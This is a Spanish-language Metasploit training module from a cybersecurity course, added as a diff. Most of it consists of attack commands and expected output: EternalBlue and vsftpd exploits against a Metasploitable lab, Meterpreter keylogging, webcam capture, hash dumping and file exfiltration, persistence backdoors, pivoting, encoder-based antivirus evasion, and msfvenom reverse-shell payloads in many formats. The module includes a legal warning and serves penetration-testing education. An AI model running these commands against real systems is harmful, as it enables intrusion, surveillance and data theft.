@@ -1,0 +1,847 @@
+---
+title: "Minicurso: Metasploit Framework"
+module: "minicurso-metasploit"
+type: "minicurso"
+description: "Tutorial completo de Metasploit Framework para explotación en ciberseguridad"
+---
+
+
+## ¿Qué es Metasploit Framework?
+
+Metasploit Framework (MSF) es la plataforma de testing de penetración de código abierto más utilizada del mundo. Desarrollada originalmente por HD Moore en 2003 y ahora mantenida por Rapid7, proporciona un entorno completo para desarrollar, probar, y ejecutar exploits contra sistemas objetivo.
+
+Metasploit incluye una base de datos de más de 2,000 exploits verificados, 500+ payloads, 300+ módulos auxiliares, y 20+ encoders. Su arquitectura modular permite crear exploits personalizados, automatizar ataques complejos, y gestionar sesiones post-explotación. La consola interactiva (msfconsole) es el punto de entrada principal para la mayoría de operaciones.
+
+En ciberseguridad, Metasploit se utiliza para validar vulnerabilidades encontradas durante el escaneo, demostrar el impacto real de un exploit, realizar pruebas de penetración completas, y validar la efectividad de controles de seguridad. Es una herramienta esencial para pentesters, red teams, y equipos de blue team que necesitan entender cómo los atacantes explotan vulnerabilidades.
+
+## ¿Por qué aprenderlo?
+
+- **2,000+ exploits**: Base de datos masiva de exploits verificados
+- **Modular**: Exploits, payloads, auxiliares, encoders, nops, post
+- **Post-explotación**: Meterpreter para control completo del sistema
+- **Automatización**: Resource scripts para ataques repetibles
+- **Estándar de la industria**: Herramienta #1 en explotación, requerida en OSCP, CEH, CompTIA PenTest+
+
+## Instalación
+
+### macOS
+
+```bash
+# Con Homebrew
+brew install metasploit
+
+# Verificar instalación
+msfconsole -v
+# Esperado:
+# Framework Version: 6.x.x-dev
+
+# Primera ejecución (descarga componentes)
+msfconsole
+# Esperado: descarga de payloads y módulos iniciales
+```
+
+::: {.callout-warning}
+## Limitaciones en macOS
+Algunos exploits y payloads de Metasploit están optimizados para Linux/Windows. En macOS, el framework funciona pero ciertos exploits pueden no estar disponibles. Para experiencia completa, se recomienda Kali Linux.
+:::
+
+### Linux (Ubuntu/Debian)
+
+```bash
+# Método recomendado: Installer de Rapid7
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall
+
+# Verificar
+msfconsole -v
+
+# O instalar desde repositorios (versión puede ser antigua)
+sudo apt update
+sudo apt install -y metasploit-framework
+
+# Iniciar servicio de PostgreSQL (para base de datos)
+sudo systemctl enable --now postgresql
+sudo msfdb init
+```
+
+### Windows
+
+```powershell
+# Descargar installer desde https://www.metasploit.com/download
+# Ejecutar el .exe installer (incluye PostgreSQL)
+
+# Verificar
+# Abrir "Metasploit Console" desde el menú de inicio
+msfconsole -v
+
+# El installer incluye:
+# - Metasploit Framework
+# - PostgreSQL database
+# - Nmap
+# - Armitage (GUI alternativa)
+```
+
+::: {.callout-warning}
+## Aviso Legal y Ético
+Metasploit es una herramienta de explotación. Ejecutar exploits contra sistemas sin autorización es ILEGAL en todas las jurisdicciones. Los exploits pueden causar daño permanente a sistemas, pérdida de datos, y interrupción de servicios. Solo usa Metasploit en sistemas propios, laboratorios de práctica, o evaluaciones con autorización explícita por escrito. El uso indebido puede resultar en cargos criminales graves.
+:::
+
+## Nivel Básico
+
+### Conceptos Fundamentales
+
+**Exploit**: Código que aprovecha una vulnerabilidad específica para ganar acceso no autorizado a un sistema.
+
+**Payload**: Código que se ejecuta después de que el exploit tiene éxito. Puede ser una shell reversa, meterpreter, o comando arbitrario.
+
+**Module**: Componente individual de Metasploit. Tipos: exploit, payload, auxiliary, post, encoder, nop.
+
+**msfconsole**: Interfaz de línea de comandos principal de Metasploit. Permite buscar, configurar, y ejecutar módulos.
+
+**Meterpreter**: Payload avanzado que proporciona una shell interactiva con capacidades extendidas (subir/bajar archivos, capturar pantalla, keylogger, pivoting).
+
+**Target**: Sistema objetivo contra el cual se ejecuta el exploit.
+
+### Comandos Esenciales de msfconsole
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `search <term>` | Buscar módulos | `search eternalblue` |
+| `use <module>` | Seleccionar módulo | `use exploit/windows/smb/ms17_010_eternalblue` |
+| `show options` | Ver opciones del módulo | `show options` |
+| `set <opt> <val>` | Configurar opción | `set RHOSTS 192.168.1.100` |
+| `setg <opt> <val>` | Configurar opción global | `setg LHOST 192.168.1.50` |
+| `run` / `exploit` | Ejecutar módulo | `exploit` |
+| `sessions` | Listar sesiones activas | `sessions -l` |
+| `sessions -i <id>` | Interactuar con sesión | `sessions -i 1` |
+| `background` | Enviar sesión a background | `background` |
+| `info` | Información del módulo | `info exploit/windows/smb/ms17_010_eternalblue` |
+| `back` | Volver al prompt principal | `back` |
+| `db_status` | Estado de la base de datos | `db_status` |
+| `hosts` | Listar hosts en DB | `hosts` |
+| `services` | Listar servicios en DB | `services` |
+
+### Navegación Básica en msfconsole
+
+```bash
+# Iniciar msfconsole
+msfconsole
+# Esperado: banner de Metasploit + prompt msf6 >
+
+# Verificar base de datos
+msf6 > db_status
+# Esperado: [*] Connected to msf. Connection type: postgresql.
+
+# Buscar exploits
+msf6 > search eternalblue
+# Esperado:
+# Matching Modules
+# ================
+#    Name                                      Disclosure Date  Rank
+#    ----                                      ---------------  ----
+#    exploit/windows/smb/ms17_010_eternalblue  2017-04-14       average
+
+# Buscar por tipo
+msf6 > search type:exploit platform:windows smb
+msf6 > search type:auxiliary scanner/ssh
+msf6 > search type:post platform:windows
+
+# Buscar por CVE
+msf6 > search cve:2021-44228
+msf6 > search cve:2017-0144
+```
+
+### Ejecutar tu Primer Exploit
+
+```bash
+# Ejemplo: EternalBlue (MS17-010) contra Metasploitable
+
+# 1. Buscar el exploit
+msf6 > search ms17_010
+
+# 2. Seleccionar exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# 3. Ver opciones requeridas
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+# Esperado:
+# Module options:
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    RHOSTS                    yes       Target host(s)
+#    RPORT    445              yes       Target port (TCP)
+
+# Payload options:
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    LHOST                     yes       Listen address
+#    LPORT    4444             yes       Listen port
+
+# 4. Configurar target
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+
+# 5. Configurar tu IP (para reverse shell)
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
+
+# 6. Verificar configuración
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+# 7. Ejecutar exploit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+# Esperado:
+# [*] Started reverse TCP handler on 192.168.1.50:4444
+# [*] Exploit completed, but no session was created.
+# o
+# [*] Sending stage (200256 bytes) to 192.168.1.100
+# [*] Meterpreter session 1 opened
+```
+
+### Gestión de Sesiones
+
+```bash
+# Listar sesiones activas
+msf6 > sessions -l
+# Esperado:
+# Active sessions
+# ===============
+#   Id  Name  Type                   Information
+#   --  ----  ----                   -----------
+#   1   meterpreter x64/windows    NT AUTHORITY\SYSTEM @ WIN-PC
+#   2   shell cmd/windows          192.168.1.100:4444 -> 192.168.1.100:49152
+
+# Interactuar con sesión
+msf6 > sessions -i 1
+# Esperado: meterpreter > prompt
+
+# Ejecutar comando en sesión
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid
+
+# Enviar sesión a background (sin cerrarla)
+meterpreter > background
+# o Ctrl+Z
+
+# Ejecutar comando en sesión sin interactuar
+msf6 > sessions -i 1 -c "sysinfo"
+
+# Matar sesión
+msf6 > sessions -k 1
+
+# Ejecutar comando shell en sesión
+msf6 > sessions -i 1 -c "ipconfig"
+```
+
+### Ejercicio 1: Explotar vulnerabilidad conocida
+
+**Objetivo:** Explotar una vulnerabilidad en Metasploitable usando Metasploit.
+
+**Paso 1:** Configurar entorno
+
+```bash
+# Iniciar Metasploitable VM
+# IP: 192.168.1.100 (ejemplo)
+
+# Verificar conectividad
+ping -c 2 192.168.1.100
+
+# Escanear servicios
+nmap -sV 192.168.1.100
+```
+
+**Paso 2:** Explotar vsftpd backdoor
+
+```bash
+msfconsole
+
+# Buscar exploit
+msf6 > search vsftpd
+
+# Usar exploit
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+
+# Configurar
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.100
+msf6 exploit(vsftpd_234_backdoor) > set RPORT 21
+
+# Ejecutar
+msf6 exploit(vsftpd_234_backdoor) > exploit
+# Esperado: Command shell session opened
+
+# Verificar
+meterpreter > whoami
+# Esperado: root
+```
+
+## Nivel Intermedio
+
+### Payloads: Reverse vs Bind Shell
+
+```bash
+# REVERSE SHELL: La víctima conecta de vuelta al atacante
+# Requiere que la víctima pueda salir a internet/red del atacante
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 192.168.1.50    # Tu IP
+msf6 exploit > set LPORT 4444             # Tu puerto
+
+# BIND SHELL: La víctima abre un puerto y el atacante conecta
+# Útil cuando la víctima no puede conectar hacia afuera
+
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/bind_tcp
+msf6 exploit > set RHOST 192.168.1.100    # IP de la víctima
+msf6 exploit > set LPORT 4444             # Puerto en la víctima
+```
+
+### Payloads Staged vs Stageless
+
+```bash
+# STAGED (con /): El exploit envía un stager pequeño que descarga el payload completo
+# Más pequeño, pero requiere conexión de red adicional
+
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+# Staged: stager + descarga meterpreter completo
+
+# STAGELESS (sin /): El payload completo se envía en el exploit
+# Más grande, pero no requiere conexión adicional
+
+msf6 > set PAYLOAD windows/x64/meterpreter_reverse_tcp
+# Stageless: todo en uno
+
+# Comparación de tamaños:
+# Staged: ~100KB stager + ~200KB meterpreter
+# Stageless: ~300KB todo junto
+```
+
+### Módulos Auxiliares
+
+```bash
+# Los módulos auxiliares NO explotan, sino que escanean, fuzzean, o analizan
+
+# Escanear SMB
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary > set RHOSTS 192.168.1.0/24
+msf6 auxiliary > run
+
+# Escanear SSH
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary > set RHOSTS 192.168.1.100
+msf6 auxiliary > set USERNAME admin
+msf6 auxiliary > set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary > run
+
+# Escanear HTTP
+msf6 > use auxiliary/scanner/http/http_version
+msf6 auxiliary > set RHOSTS 192.168.1.0/24
+msf6 auxiliary > run
+
+# Escanear MySQL
+msf6 > use auxiliary/scanner/mysql/mysql_version
+msf6 auxiliary > set RHOSTS 192.168.1.100
+msf6 auxiliary > run
+
+# Escanear SNMP
+msf6 > use auxiliary/scanner/snmp/snmp_login
+msf6 auxiliary > set RHOSTS 192.168.1.0/24
+msf6 auxiliary > set COMMUNITY public
+msf6 auxiliary > run
+```
+
+### Base de Datos Integration
+
+```bash
+# Inicializar base de datos
+sudo msfdb init
+
+# Verificar conexión
+msf6 > db_status
+
+# Escanear con nmap y guardar resultados en DB
+msf6 > db_nmap -sV 192.168.1.100
+
+# Ver hosts en DB
+msf6 > hosts
+# Esperado: lista de hosts descubiertos con OS, servicios
+
+# Ver servicios en DB
+msf6 > services
+# Esperado: lista de servicios por host
+
+# Buscar hosts por servicio
+msf6 > services -p 445
+msf6 > services -c port,name,info
+
+# Importar resultados de nmap
+msf6 > db_import /path/to/nmap.xml
+
+# Exportar datos
+msf6 > db_export -f xml /tmp/export.xml
+
+# Workspace management
+msf6 > workspace -a client-a
+msf6 > workspace client-a
+msf6 > workspace -d client-a
+```
+
+### Meterpreter Básico
+
+```bash
+# Después de obtener una sesión meterpreter:
+
+# Información del sistema
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid
+meterpreter > getprivs
+
+# Sistema de archivos
+meterpreter > ls
+meterpreter > cd /path
+meterpreter > pwd
+meterpreter > upload /local/file /remote/path
+meterpreter > download /remote/file /local/path
+meterpreter > cat /remote/file
+meterpreter > search -f *.txt
+meterpreter > mkdir /new/directory
+
+# Procesos
+meterpreter > ps
+meterpreter > migrate <pid>
+meterpreter > kill <pid>
+
+# Red
+meterpreter > ipconfig
+meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100
+meterpreter > route print
+
+# Screenshots y webcam
+meterpreter > screenshot
+meterpreter > webcam_list
+meterpreter > webcam_snap
+
+# Keylogger
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+```
+
+### Ejercicio 2: Post-explotación con Meterpreter
+
+**Objetivo:** Establecer sesión Meterpreter y ejecutar módulos post-explotación.
+
+**Paso 1:** Obtener sesión
+
+```bash
+# Usar exploit para obtener sesión (ejercicio anterior)
+# Una vez con sesión meterpreter:
+
+meterpreter > sysinfo
+meterpreter > getuid
+```
+
+**Paso 2:** Recopilar información
+
+```bash
+# Información del sistema
+meterpreter > sysinfo
+meterpreter > getprivs
+
+# Hashes de contraseñas (Windows)
+meterpreter > run post/windows/gather/smart_hashdump
+
+# Información de red
+meterpreter > ipconfig
+meterpreter > route print
+
+# Archivos interesantes
+meterpreter > search -f *.pdf -d C:\\
+meterpreter > search -f *.docx -d C:\\
+meterpreter > download C:\\Users\\Admin\\Documents\\passwords.txt
+```
+
+**Paso 3:** Ejecutar módulos post
+
+```bash
+# Background la sesión
+meterpreter > background
+
+# Buscar módulos post
+msf6 > search post/windows/gather
+
+# Ejecutar módulo post
+msf6 > use post/windows/gather/enum_logged_on_users
+msf6 post > set SESSION 1
+msf6 post > run
+
+# Ejecutar módulo de escalada
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post > set SESSION 1
+msf6 post > run
+```
+
+## Nivel Avanzado
+
+### Desarrollo de Módulos Personalizados
+
+```bash
+# Estructura básica de un exploit module
+# Guardar en: ~/.msf4/modules/exploits/custom/my_exploit.rb
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'My Custom Exploit',
+      'Description' => 'Exploit for custom vulnerability',
+      'Author' => ['Tu Nombre'],
+      'License' => MSF_LICENSE,
+      'Platform' => ['linux', 'win'],
+      'Arch' => [ARCH_X86, ARCH_X64],
+      'Targets' => [['Default', {}]],
+      'DefaultTarget' => 0,
+      'DisclosureDate' => '2024-01-01'
+    ))
+
+    register_options([
+      Opt::RPORT(12345),
+      OptString.new('PARAM', [true, 'Vulnerable parameter', 'value'])
+    ])
+  end
+
+  def exploit
+    connect
+    sock.put("VULNERABLE #{datastore['PARAM']}\r\n")
+    handler
+    disconnect
+  end
+end
+
+# Recargar módulos en msfconsole
+msf6 > reload_all
+```
+
+### Pivoting y Lateral Movement
+
+```bash
+# Pivoting: usar una máquina comprometida para acceder a otra red
+
+# Paso 1: Obtener sesión en máquina con acceso a red interna
+meterpreter > ipconfig
+# Verificar que tiene interfaz en red interna (ej: 10.0.0.x)
+
+# Paso 2: Agregar ruta a red interna
+meterpreter > run post/multi/manage/autoroute
+# o manualmente:
+meterpreter > run autoroute -s 10.0.0.0/24
+
+# Paso 3: Verificar rutas
+meterpreter > run autoroute -p
+
+# Paso 4: Usar módulos contra red interna desde la sesión
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary > set RHOSTS 10.0.0.0/24
+msf6 auxiliary > set SESSION 1
+msf6 auxiliary > run
+
+# Port forwarding
+meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50
+# Ahora rdp://localhost:3389 va a 10.0.0.50:3389
+```
+
+### Evasion Techniques
+
+```bash
+# Encoders para evadir detección básica
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set ENCODER x64/xor_dynamic
+msf6 exploit > set ENCODER x64/zutto_dekiru
+
+# Iteraciones de encoding
+msf6 exploit > set ITERATIONS 5
+
+# NOP generators
+msf6 exploit > set NOP x64/single_static_bit
+
+# Custom LPORT para evadir firewall
+msf6 exploit > set LPORT 443
+# o
+msf6 exploit > set LPORT 8080
+
+# Stagerless payload (menos detectable)
+msf6 exploit > set PAYLOAD windows/x64/meterpreter_reverse_https
+# HTTPS es menos sospechoso que TCP raw
+```
+
+### Resource Scripts
+
+```bash
+# Automatizar ataques con scripts .rc
+
+# Crear script
+cat > auto-exploit.rc << 'EOF'
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit -j
+EOF
+
+# Ejecutar script
+msfconsole -r auto-exploit.rc
+
+# Script completo de pentest
+cat > full-pentest.rc << 'EOF'
+# Recon
+db_nmap -sV -O 192.168.1.0/24
+
+# Mostrar resultados
+hosts
+services -c port,name,info
+
+# Explotar SMB
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+exploit -j
+
+# Explotar FTP
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.1.100
+exploit -j
+EOF
+
+msfconsole -r full-pentest.rc
+```
+
+### Ejercicio 3: Auditoría completa con Metasploit
+
+**Objetivo:** Realizar una evaluación de seguridad completa usando Metasploit.
+
+**Paso 1:** Reconnaissance
+
+```bash
+msfconsole
+
+# Escanear red
+msf6 > db_nmap -sV -O -oA full-scan 192.168.1.0/24
+
+# Ver resultados
+msf6 > hosts
+msf6 > services
+```
+
+**Paso 2:** Vulnerability scanning
+
+```bash
+# Escanear vulnerabilidades SMB
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary > set RHOSTS 192.168.1.0/24
+msf6 auxiliary > run
+
+# Escanear vulnerabilidades SSH
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary > set RHOSTS 192.168.1.100
+msf6 auxiliary > set USER_FILE users.txt
+msf6 auxiliary > set PASS_FILE passwords.txt
+msf6 auxiliary > run
+```
+
+**Paso 3:** Exploitation y reporting
+
+```bash
+# Explotar vulnerabilidades encontradas
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS 192.168.1.100
+msf6 exploit > set LHOST 192.168.1.50
+msf6 exploit > exploit
+
+# Post-explotación
+msf6 > sessions -i 1
+meterpreter > sysinfo
+meterpreter > run post/windows/gather/enum_logged_on_users
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Generar reporte
+msf6 > db_export -f xml /tmp/pentest-report.xml
+```
+
+## Uso en Ciberseguridad
+
+### Escenario 1: Vulnerability validation
+
+```bash
+# Cuando un scanner (Nessus, OpenVAS) encuentra vulnerabilidades
+# Validar con Metasploit si son explotables
+
+# 1. Identificar CVE del reporte
+# 2. Buscar exploit en Metasploit
+msf6 > search cve:2017-0144
+
+# 3. Configurar y ejecutar contra target
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS <target>
+msf6 exploit > set LHOST <attacker>
+msf6 exploit > exploit
+
+# 4. Si funciona: vulnerabilidad confirmada como crítica
+# 5. Si falla: puede ser false positive o parcheado
+# 6. Documentar resultado en reporte
+```
+
+### Escenario 2: Red team operations
+
+```bash
+# Operaciones de red team con Metasploit
+
+# Fase 1: Initial access
+# - Explotar servicio expuesto
+# - Phishing con payload personalizado
+# - USB drop attack
+
+# Fase 2: Persistence
+meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.50
+# Instala backdoor que reconecta cada 30 segundos
+
+# Fase 3: Privilege escalation
+meterpreter > getsystem
+# Intenta escalada automática a SYSTEM
+
+# Fase 4: Lateral movement
+meterpreter > run post/windows/gather/credentials/windows_autologin
+meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50
+
+# Fase 5: Data exfiltration
+meterpreter > download C:\\sensitive\\*.docx /tmp/exfil/
+```
+
+### Escenario 3: Security control validation
+
+```bash
+# Verificar que los controles de seguridad funcionan
+
+# Test 1: Antivirus detection
+# Generar payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o test.exe
+
+# ¿El antivirus lo detecta? Si sí, el AV funciona.
+
+# Test 2: Firewall rules
+# Intentar conexión a puertos bloqueados
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary > set RHOSTS target
+msf6 auxiliary > set PORTS 4444,5555,6666
+msf6 auxiliary > run
+
+# Test 3: IDS/IPS detection
+# Ejecutar exploit conocido y verificar si genera alerta
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS target
+msf6 exploit > exploit
+# Verificar logs del IDS/IPS
+```
+
+## Referencia Rápida
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `search` | Buscar módulos | `search eternalblue` |
+| `use` | Seleccionar módulo | `use exploit/windows/smb/ms17_010` |
+| `show options` | Ver opciones | `show options` |
+| `set` | Configurar opción | `set RHOSTS 192.168.1.100` |
+| `setg` | Opción global | `setg LHOST 192.168.1.50` |
+| `exploit` | Ejecutar exploit | `exploit` |
+| `run` | Ejecutar módulo | `run` |
+| `sessions -l` | Listar sesiones | `sessions -l` |
+| `sessions -i` | Interactuar | `sessions -i 1` |
+| `background` | Background sesión | `background` |
+| `db_nmap` | Nmap con DB | `db_nmap -sV target` |
+| `hosts` | Hosts en DB | `hosts` |
+| `services` | Servicios en DB | `services` |
+| `msfvenom` | Generar payloads | `msfvenom -p payload -f exe -o file.exe` |
+| `workspace` | Gestionar workspaces | `workspace -a client` |
+
+## Recursos Adicionales
+
+- **Documentación oficial**: https://docs.metasploit.com/
+- **Metasploit Unleashed**: https://www.offsec.com/metasploit-unleashed/ (curso gratuito)
+- **Rapid7 Blog**: https://www.rapid7.com/blog/
+- **Practice**: https://www.vulnhub.com/ (VMs vulnerables)
+- **Metasploitable**: https://sourceforge.net/projects/metasploitable/
+- **MSFVenom guide**: https://offsec.almond.consulting/msfvenom.html
+
+## Apéndice: MSFVenom Payload Generation
+
+MSFVenom es el generador de payloads de Metasploit. Reemplaza msfpayload y msfencode.
+
+### Sintaxis Básica
+```bash
+msfvenom -p <payload> <options> -f <format> -o <output>
+```
+
+### Payloads Comunes
+```bash
+# Reverse shell Linux
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+# Reverse shell Windows
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+# Reverse shell macOS
+msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell.macho
+
+# PHP reverse shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+
+# Python reverse shell
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+
+# ASP reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+
+# JSP reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
+
+# WAR file (Java)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
+```
+
+### Encoding para Evasión
+```bash
+# Con encoding simple
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -e x64/xor -i 5 -f exe -o encoded.exe
+
+# Con bad characters (evitar bytes problemáticos)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
+    -b '\x00\x0a\x0d' -f exe -o shell.exe
+
+# Listar encoders disponibles
+msfvenom --list encoders
+
+# Listar formats disponibles
+msfvenom --list formats
+
+# Listar payloads disponibles
+msfvenom --list payloads | grep meterpreter
+```
+
+### Stageless vs Staged
+```bash
+# Staged (con /): más pequeño, requiere conexión adicional
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o staged.exe
+
+# Stageless (sin /): más grande, todo en uno
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o stageless.exe
+```
+
+---
+
+*Minicurso Metasploit — Curso Fundamentos de Ciberseguridad — CC BY-SA 4.0*
